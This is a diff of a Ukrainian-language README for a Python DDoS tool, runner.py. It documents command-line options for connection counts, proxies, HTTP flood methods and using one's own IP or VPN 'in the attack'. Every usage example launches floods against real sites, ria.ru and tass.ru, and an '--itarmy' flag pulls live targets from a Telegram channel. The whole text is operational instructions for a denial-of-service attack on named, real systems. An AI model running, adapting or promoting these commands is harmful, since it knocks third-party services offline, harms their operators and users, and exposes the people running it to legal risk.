@@ -39,14 +39,18 @@
 
 **Усі параметри можна комбінувати**, можна вказувати і до і після переліку цілей
 
-Змінити навантаження - `-t XXXX` - максимальна кількість одночасно відкритих зʼєднань, за замовчуванням 7500 (або 1000 якщо на машині лише 1 CPU).
+Змінити навантаження - `-t XXXX` - максимальна кількість одночасно відкритих зʼєднань, за замовчуванням 7500 (або 1000 якщо на машині лише 1 CPU)
 
     python3 runner.py -t 5000 https://ria.ru https://tass.ru
 
-Щоб переглянути інформацію про хід роботи, додайте параметр  `--debug` для тексту, `--table` для таблиці.
+Щоб переглянути інформацію про хід роботи, додайте параметр  `--debug` для тексту, `--table` для таблиці
 
-    python3 runner.py --debug https://ria.ru https://tass.ru
-    
+    python3 runner.py https://ria.ru --debug
+
+Щоб додати ваш IP/VPN до атаки (особливо актуально для виділених серверів)
+
+    python3 runner.py https://ria.ru https://tass.ru --vpn
+
 Щоб обрати цілі від https://t.me/itarmyofukraine2022 додайте параметр `--itarmy`  
 
     python3 runner.py --itarmy --debug
@@ -69,7 +73,6 @@
                      [--table]
                      [--debug]
                      [--vpn]
-                     [--rpc RPC] 
                      [--http-methods METHOD [METHOD ...]]
                      [--itarmy]
                      [--copies COPIES]
@@ -81,10 +84,8 @@
       -h, --help             show this help message and exit
       -c, --config URL|path  URL or local path to file with targets list
       -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
-      --table                Print log as table
-      --debug                Print log as text
+      --table / --debug      Print log as table / as text
       --vpn                  Use both my IP and proxies. Optionally, specify a percent of using my IP (default is 10%)
-      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
       --proxies URL|path     URL or local path(ex. proxies.txt) to file with proxies to use
       --http-methods GET     List of HTTP(L7) methods to use (default is GET + POST|STRESS).
       --itarmy               Attack targets from https://t.me/itarmyofukraine2022  
